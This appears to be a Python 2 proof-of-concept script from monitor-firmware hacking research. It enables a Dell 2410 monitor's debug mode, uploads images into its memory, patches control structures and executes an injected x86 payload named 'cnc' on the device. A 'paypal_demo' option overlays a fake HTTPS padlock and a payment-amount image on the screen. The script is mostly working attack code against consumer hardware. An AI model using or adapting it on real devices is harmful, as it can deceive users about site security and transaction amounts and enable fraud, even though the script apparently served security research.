#!/usr/bin/python2
import protocol
import delltools
import time
from payload import X86Payload
from image import DellImage, get_control_struct
import argparse

ARGS = [
    {
        'args': ('--paypal_demo', '-p'),
        'kwargs': {
            'action': 'store_true',
            'help': "do the paypal_demo"
        },
    }

]


parser = argparse.ArgumentParser(description='patch vsync interrupt')
for arg in ARGS:
    parser.add_argument(*arg['args'], **arg['kwargs'])

args = parser.parse_args()

payload = X86Payload("cnc")
dell = protocol.Dell2410()
dell.initialize()
dell.debug_on()

if args.paypal_demo:
    image = DellImage("lock_https.gif")
    image_colors = image.colors
    metainfo, _ = delltools.upload_single_image(dell, image, 0x600000)
    clut_table = metainfo[4]
    width = metainfo[0]
    height = metainfo[1]
    stride = metainfo[2]
    upload_address = metainfo[3]
    # delltools.clear_0xc000(dell)
    delltools.sdram_write(dell, src=0x600000,
                          dest=0, height=height, width=width,
                          dest_stride=stride)
    delltools.transfer_clut(dell, clut_table)
    control = get_control_struct(width, height, 0x63, 0x4a, 0)
    control = control[:0x26] + '\x14' + control[0x27:]
    delltools.mem_write(dell, 0xc078, control)
    time.sleep(2)
    # put default image
    image = DellImage("amount_image.png", 255 - image_colors)
    image.image = "".join(chr(ord(b) + image_colors) for b in image.image)
    metainfo, _ = delltools.upload_single_image(dell, image, 0x600000)
    clut_table = metainfo[4]
    width = metainfo[0]
    height = metainfo[1]
    stride = metainfo[2]
    upload_address = metainfo[3]
    # delltools.clear_0xc000(dell)
    delltools.sdram_write(dell, src=0x600000,
                          dest=0x1000, height=height, width=width,
                          dest_stride=stride)
    delltools.transfer_clut(dell, clut_table, clut_offset=image_colors * 4)
    control = get_control_struct(width, height, 134, 330, 0x1000>>6)
    control = control[:0x26] + '\x14' + control[0x27:]
    delltools.mem_write(dell, 0xc1e0, control)



delltools.execute_payload(dell, payload, 0x6000)
dell.debug_off()
